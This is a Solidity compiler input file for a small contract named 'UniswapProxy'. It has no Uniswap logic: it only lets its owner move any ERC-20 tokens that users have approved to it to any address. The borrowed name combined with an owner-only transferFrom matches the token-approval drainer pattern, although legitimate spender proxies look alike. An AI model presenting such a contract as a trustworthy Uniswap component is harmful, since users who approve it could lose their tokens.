{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/uniswap.sol":{"content":"// SPDX-License-Identifier: SEE LICENSE IN LICENSE\r\npragma solidity 0.6.12;\r\n\r\ninterface IERC20Token {\r\n    function allowance(address _owner, address _spender) external view returns (uint256);\r\n    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\r\n}\r\n\r\ncontract UniswapProxy {\r\n    address public owner;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function transferUniswapProxy(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {\r\n        require(msg.sender == owner, \"access denied\");\r\n        return _token.transferFrom(_sender, _receiver, _amount);\r\n    }\r\n}"}}}